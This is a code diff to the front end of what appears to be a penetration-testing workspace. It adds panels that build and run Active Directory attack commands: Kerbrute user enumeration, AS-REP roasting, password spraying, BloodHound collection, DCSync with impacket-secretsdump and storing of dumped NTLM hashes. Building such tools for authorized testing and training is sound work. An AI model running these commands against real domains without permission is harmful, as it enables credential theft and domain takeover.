@@ -11,6 +11,10 @@ import { getCredentialAuditProfile } from "./credentialAudit";
 import { summarizeCredentialAudit } from "./credentialAuditResult";
 import { useCredentialStore } from "./useCredentialStore";
 import FuzzingPanel from "./FuzzingPanel";
+import KerbruteEnumPanel from "./KerbruteEnumPanel";
+import AsrepRoastPanel from "./AsrepRoastPanel";
+import PasswordSprayPanel from "./PasswordSprayPanel";
+import DomainDominancePanel from "./DomainDominancePanel";
 import SmbShareResults from "./SmbShareResults";
 import ServiceList from "./ServiceList";
 import ExecutionHistory from "./ExecutionHistory";
@@ -65,6 +69,7 @@ export default function App() {
   const [executionDetail, setExecutionDetail] = useState<any>();
   const [lastSpiderShare, setLastSpiderShare] = useState<string>();
   const [evidenceMsg, setEvidenceMsg] = useState("");
+  const [saveHashMsg, setSaveHashMsg] = useState("");
   const [psexecSession, setPsexecSession] = useState<
     {id: number; command: string} | undefined
   >();
@@ -101,6 +106,10 @@ export default function App() {
   );
   const [confirm, setConfirm] = useState<any>();
   const [runWithSudo, setRunWithSudo] = useState(true);
+  const [outputFilename, setOutputFilename] = useState("");
+  // Most recently derived (extracted-column) file path, offered as a
+  // one-click wordlist fill for AS-REP roasting / Kerbrute panels.
+  const [derivedWordlistPath, setDerivedWordlistPath] = useState("");
   const [serviceNotes, setServiceNotes] = useState("");
   const [serviceTags, setServiceTags] = useState("");
   const [serviceProduct, setServiceProduct] = useState("");
@@ -205,6 +214,7 @@ export default function App() {
   const credentialProfile = getCredentialAuditProfile(service?.name);
   const reviewCommand = (command: any) => {
     setRunWithSudo(Boolean(command.sudo));
+    setOutputFilename("");
     setConfirm(command);
   };
   const openSuccessfulFtpTerminal = async (
@@ -267,6 +277,10 @@ export default function App() {
     const c = explicitCommand ?? confirm;
     if (!c || !targetId) return;
     setConfirm(null);
+    // Consume-and-clear so a filename typed for one review doesn't leak into
+    // the next direct-run call (Kerbrute, AS-REP…) which skips the modal.
+    const requestedFilename = outputFilename.trim();
+    setOutputFilename("");
     if (c.execution_mode === "interactive") {
       try {
         const variables: any = {};
@@ -325,6 +339,7 @@ export default function App() {
           template_id: c.id,
           variables: c.variables || {},
           run_as_root: runWithSudo,
+          output_filename: requestedFilename,
         }),
       });
     } catch (reason) {
@@ -561,14 +576,11 @@ export default function App() {
       `impacket-mssqlclient ${shellQuote(auth)} -port ${service.port}`,
     );
   };
-  const openHashcatShell = async () => {
-    if (!target) return;
-    // Kerberoast TGS-REP hashes are hashcat mode 13100. The manual shell opens
-    // in the target dir; the roast file lives under outputs/. User points
-    // hashcat at their own wordlist, then registers the cracked password below.
-    await openManualShell(
-      "hashcat -m 13100 outputs/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt",
-    );
+  const openHashcatShell = (mode: string = "kerberoast") => {
+    if (!targetId) return;
+    localStorage.setItem("oscp-workspace-hash-target", String(targetId));
+    localStorage.setItem("oscp-workspace-hash-mode", mode);
+    location.hash = "hash-cracking";
   };
   const viewSmbFile = (path: string) => {
     if (!target || !service || !lastSpiderShare) return;
@@ -651,6 +663,86 @@ export default function App() {
       target_level: false,
       variables: {wordlist},
     });
+  };
+  const runKerbruteEnum = (domain: string, wordlist: string) => {
+    if (!target || !service || !domain.trim() || !wordlist.trim()) return;
+    setRunWithSudo(false);
+    void run({
+      id: "kerberos-user-enum-kerbrute",
+      preview: `kerbrute userenum -d ${domain} --dc ${target.ip} ${wordlist}`,
+      target_level: false,
+      variables: {domain, wordlist},
+    });
+  };
+  const runAsrepRoast = (domain: string, wordlist: string) => {
+    if (!target || !domain.trim() || !wordlist.trim()) return;
+    setRunWithSudo(false);
+    void run({
+      id: "ad-asreproast-impacket",
+      preview: `impacket-GetNPUsers ${domain}/ -usersfile ${wordlist} -no-pass` +
+        ` -dc-ip ${target.ip} -outputfile <output_dir>/asrep-hashes.txt`,
+      target_level: true,
+      variables: {domain, wordlist},
+    });
+  };
+  const runPasswordSpray = (wordlist: string, password: string) => {
+    if (!target || !wordlist.trim() || !password.trim()) return;
+    setRunWithSudo(false);
+    void run({
+      id: "ad-password-spray-netexec",
+      preview: `nxc ldap ${target.ip} -u ${wordlist} -p ${password} --continue-on-success`,
+      target_level: true,
+      variables: {wordlist, password},
+    });
+  };
+  const runBloodhoundCollect = () => {
+    if (!target || !credStore.username.trim() || !credStore.password.trim()) return;
+    setRunWithSudo(false);
+    void run({
+      id: "ad-bloodhound-collect",
+      preview: `bloodhound-python -u ${credStore.username} -p *** -d ${credStore.domain}` +
+        ` -ns ${target.ip} -c All --zip`,
+      target_level: true,
+      variables: {
+        username: credStore.username, password: credStore.password,
+        domain: credStore.domain,
+      },
+    });
+  };
+  const runDcsync = () => {
+    if (!target || !credStore.username.trim() || !credStore.password.trim()) return;
+    setRunWithSudo(false);
+    void run({
+      id: "ad-dcsync-secretsdump",
+      preview: `impacket-secretsdump ${credStore.domain}/${credStore.username}:***` +
+        `@${target.ip} -just-dc`,
+      target_level: true,
+      variables: {
+        username: credStore.username, password: credStore.password,
+        domain: credStore.domain,
+      },
+    });
+  };
+  const saveDcsyncHash = async (dumpedUsername: string, nthash: string) => {
+    if (!projectId || !targetId) return;
+    setSaveHashMsg("");
+    try {
+      await api("/runbooks/credentials", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          project_id: projectId, target_id: targetId,
+          username: dumpedUsername, domain: credStore.domain,
+          secret: nthash, secret_hint: "NTLM hash (DCSync)",
+          source_kind: "dcsync", source_detail: `DCSync via ${credStore.username}`,
+          service_names: [],
+        }),
+      });
+      await qc.invalidateQueries({queryKey: ["credentials", projectId]});
+      setSaveHashMsg(`${dumpedUsername} 해시를 Credential Store에 저장함`);
+    } catch (reason) {
+      setSaveHashMsg(`저장 실패: ${reason instanceof Error ? reason.message : reason}`);
+    }
   };
   const togglePrivescServer = async () => {
     setPrivescServerBusy(true);
@@ -970,6 +1062,44 @@ export default function App() {
               onFuzz={runDirectoryFuzz}
               onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)} />
           )}
+          {["kerberos-sec", "kerberos"].includes(serviceNameLower) && (
+            <KerbruteEnumPanel target={target} service={service}
+              runState={runStates["kerberos-user-enum-kerbrute"]}
+              serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
+              wordlistSuggestion={derivedWordlistPath}
+              onEnum={runKerbruteEnum}
+              onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)} />
+          )}
+          {["kerberos-sec", "kerberos"].includes(serviceNameLower) && (
+            <AsrepRoastPanel target={target}
+              runState={runStates["ad-asreproast-impacket"]}
+              serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
+              wordlistSuggestion={derivedWordlistPath}
+              onRoast={runAsrepRoast}
+              onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)}
+              onOpenHashcat={() => openHashcatShell("asreproast")} />
+          )}
+          {["ldap", "ldaps"].includes(serviceNameLower) && (
+            <PasswordSprayPanel target={target}
+              runState={runStates["ad-password-spray-netexec"]}
+              serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
+              wordlistSuggestion={derivedWordlistPath}
+              onSpray={runPasswordSpray}
+              onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)} />
+          )}
+          {["ldap", "ldaps"].includes(serviceNameLower) && (
+            <DomainDominancePanel target={target}
+              domain={credStore.domain} username={credStore.username}
+              password={credStore.password}
+              bloodhoundRunState={runStates["ad-bloodhound-collect"]}
+              dcsyncRunState={runStates["ad-dcsync-secretsdump"]}
+              serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
+              onCollectBloodhound={runBloodhoundCollect} onDcsync={runDcsync}
+              onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)}
+              onFillCredential={(u, h) => { credStore.setUsername(u); credStore.setPassword(h); }}
+              onSaveHash={(u, h) => void saveDcsyncHash(u, h)}
+              saveHashMsg={saveHashMsg} />
+          )}
           {!!netexecProtocol && (
             <section className="netexecCredCheck"
               aria-labelledby="netexec-cred-heading">
@@ -1052,6 +1182,7 @@ export default function App() {
             onView={setExecutionView}
             onOpen={openExecution}
             onStop={stopSavedExecution}
+            onDerived={setDerivedWordlistPath}
           />
           {!workspaceCollapsed && <div
             className="workspaceResizeHandle"
@@ -1103,7 +1234,8 @@ export default function App() {
         }}
         onStop={(templateId) => void stopRun(templateId)} />
       <CommandReviewModal command={confirm} runWithSudo={runWithSudo}
-        onSudo={setRunWithSudo} onCancel={() => setConfirm(null)}
+        onSudo={setRunWithSudo} outputFilename={outputFilename}
+        onOutputFilename={setOutputFilename} onCancel={() => setConfirm(null)}
         onRun={() => void run()} />
     </div>
   );
